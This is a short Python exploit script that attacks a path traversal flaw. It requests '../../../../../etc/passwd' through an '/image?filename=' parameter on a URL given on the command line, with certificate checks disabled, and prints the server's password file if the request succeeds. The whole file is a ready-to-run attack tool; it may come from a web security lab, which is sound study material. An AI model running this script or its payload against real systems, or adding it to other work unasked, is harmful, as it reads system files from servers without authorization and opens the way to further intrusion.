import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def exploit_path_traversal(url):
    # Implementation for exploiting path traversal vulnerability
    target_url = url + "/image?filename=../../../../../etc/passwd"
    r = requests.get(target_url, verify=False)
    if r.status_code == 200:
        print("(+) Path traversal exploit successful!")
        print("(+) The following is the content of the /etc/passwd file:")
        print(r.text)
    else:
        print("(-) Exploit failed.")
        sys.exit(1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: python3 %s <target_url>" % sys.argv[0])
        print("(+) Example: python3 %s https://target.com" % sys.argv[0])
        sys.exit(1)

    else:
        url = sys.argv[1]

        print("(+) Exploiting path traversal vulnerability...")
        exploit_path_traversal(url)


if __name__ == "__main__":
    main()